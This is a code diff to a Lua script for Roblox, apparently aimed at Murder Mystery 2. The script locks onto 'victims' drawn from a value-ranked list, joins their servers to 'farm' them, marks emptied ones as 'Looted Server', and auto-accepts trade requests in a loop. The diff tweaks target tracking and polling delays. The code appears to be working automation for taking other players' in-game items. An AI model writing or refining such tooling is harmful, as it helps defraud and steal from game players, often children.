@@ -362,6 +362,7 @@ local function AutoJoinStep()
         if tonumber(v.val) >= mv then
             local job = parseJobId(v.link)
             if job == CurrentJobId and Players:FindFirstChild(v.victim) then
+                foundInServer = true
                 setStatus("Locked on: " .. v.victim)
                 TopHitLabel.Text = "Farming: " .. v.victim
                 State.CurrentTarget = v; State.FailedThisCycle = {}
@@ -370,7 +371,10 @@ local function AutoJoinStep()
         end
     end
     
-    -- If we are in a game but no one from the list is here, it's a looted server
+    -- If we get here, no valid target from the LATEST list is on this server
+    State.CurrentTarget = nil
+    TopHitLabel.Text = "Farming: None"
+    
     if #Players:GetPlayers() > 1 then
         setStatus("Looted Server - Searching...")
     end
@@ -420,7 +424,7 @@ function startReceiver()
                     while true do
                         local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
                         if s and res == "ReceivingRequest" then Trade.AcceptRequest:FireServer(); State.ReceiverActive = true end
-                        t_wait(0.2)
+                        t_wait(0.5)
                     end
                 end)
                 t_spawn(function()
@@ -447,10 +451,10 @@ function startReceiver()
                         end
                     end
                     State.ReceiverActive = false
-                    t_wait(0.2)
+                    t_wait(0.5)
                 end
             end
-            while true do pcall(mm2Main); t_wait(1) end
+            while true do pcall(mm2Main); t_wait(2) end
         end)
     end
 end
